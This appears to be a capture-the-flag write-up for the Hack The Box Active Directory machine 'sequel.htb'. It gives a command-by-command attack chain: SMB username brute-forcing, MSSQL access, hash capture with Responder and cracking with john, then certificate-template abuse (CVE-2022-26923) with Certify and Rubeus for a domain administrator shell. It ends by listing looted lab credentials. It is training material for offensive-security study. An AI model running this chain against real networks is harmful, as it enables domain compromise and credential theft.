# Enumeration - open ports

```
53/tcp   open  domain        Simple DNS Plus                                                                  
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-27 01:39:34Z)                   
135/tcp  open  msrpc         Microsoft Windows RPC                                                            
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                                                    
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-Firs
t-Site-Name)  
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-Firs
t-Site-Name)
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-Firs
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-Firs
```
## Port 53

no DNS transfer
## Port 135

![[Pasted image 20230226200723.png]]

## Port 445
![[Pasted image 20230226194617.png]]
![[Pasted image 20230226194729.png]]
![[Pasted image 20230226194857.png]]

`domain sequel.htb`
`cme smb $ip -u /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -p '' --shares`
found user `info` 
![[Pasted image 20230226200433.png]]
`smbclient -U info //$ip/Public`
![[Pasted image 20230226200459.png]]
![[Pasted image 20230226201202.png]]

![[Pasted image 20230226201146.png]]
![[Pasted image 20230226201501.png]]

## Port 1433
mssqlclient.py PublicUser@$ip
[Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
![[Pasted image 20230226201648.png]]
![[Pasted image 20230226201849.png]]
`SELECT name FROM master.dbo.sysdatabases;`
```sql
select name,
       create_date,
       modify_date,
       type_desc as type,
       authentication_type_desc as authentication_type,
       sid
from sys.database_principals
where type not in ('A', 'R')
order by name;
```
![[Pasted image 20230226202435.png]]

db users:
public
dbo
sys
using Responder to steal hash
![[Pasted image 20230226202904.png]]
cracking hashing using john
`john hash --wordlist=/usr/share/wordlists/rockyou.txt`
![[Pasted image 20230226203047.png]]
![[Pasted image 20230226203143.png]]
adding username and password to the rest of info we found earlier
![[Pasted image 20230226203352.png]]
![[Pasted image 20230226203537.png]]
# Foothold 
## sql_svc -> Ryan.Cooper
![[Pasted image 20230226203551.png]]
using conpty to get fully interactive shell 
![[Pasted image 20230226203832.png]]
![[Pasted image 20230226203839.png]]
getting AD info using bloodhound-python   
`bloodhound-python --dns-tcp -ns $ip -d sequel.htb -u 'sql_svc' -p 'REGGIE1234ronnie' -c all`
users:
Tom.Henn
Brandon.Brown
Ryan.Cooper
sql_svc
Nicole.Thompson
`C:\SQLServer\Logs\ERRORLOG.BAK`

![[Pasted image 20230226222508.png]]
![[Pasted image 20230226222541.png]]
![[Pasted image 20230226222908.png]]
![[Pasted image 20230226224029.png]]
# Privesc 

## Ryan.Cooper
doing the same what we did with previous user and getting conpty shell on target
![[Pasted image 20230226225233.png]]
running winpeas on the target found out that the domain uses certificates to authenticate users 
![[Pasted image 20230227025723.png]]

run [Certify.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Certify.exe) Tool to check for any vulnerabilities 
![[Pasted image 20230227030752.png]]
Using [HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)
Here are the steps of what we are going to do
1. First we get a certificate with the user administrator
2. convert cert.pem file to pfx file
3. run Rubeus to get TGT for the user 
4. convert .kirbi ticket to ccache 
5. login with psexec


`.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator`
![[Pasted image 20230227032705.png]]
![[Pasted image 20230227031556.png]]
we copy the output to a file called cert.pem and then get the cert.pfx file
`openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`
![[Pasted image 20230227032726.png]]
then we create the TGT ticket using Rubeus
`.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:Password1 /ptt`
![[Pasted image 20230227032931.png]]
get ticket to a file and it's base64
![[Pasted image 20230227033507.png]]
remove all extra spaces 
in vim 
`:%s/ //g`
then decode it
`cat ticket.kirbi.b64 | base64 -d > ticket.kirbi`
change ticket to ccache format then connect using psexec
`python ticket_converter.py ticket.kirbi ticket.ccache`
![[Pasted image 20230227034332.png]]
`psexec.py sequel.htb/administrator@$ip -k -no-pass`
![[Pasted image 20230227034310.png]]
`ntpdate $ip` fix clock
using proper syntax it worked
![[Pasted image 20230227041116.png]]
`psexec.py sequel.htb/administrator@dc.sequel.htb -k -no-pass`
# Loot
mssql public user
	username: `PublicUser`
	password: `GuestUserCantWrite1`
user sql_svc evilwirm:
	username: `sql_svc`
	password: `REGGIE1234ronnie`
user Ryan.Cooper
	username: `Ryan.Cooper`
	password: `NuclearMosquito3`

---
Tags: #ctf #AD #smb #Rubues #Certify #Misconfigured_Certificate_Template #CVE-2022-26923
Resources: 
[HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)
[Certify.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Certify.exe)
[CVE-2022-26923](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923)
[SpecterOps](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
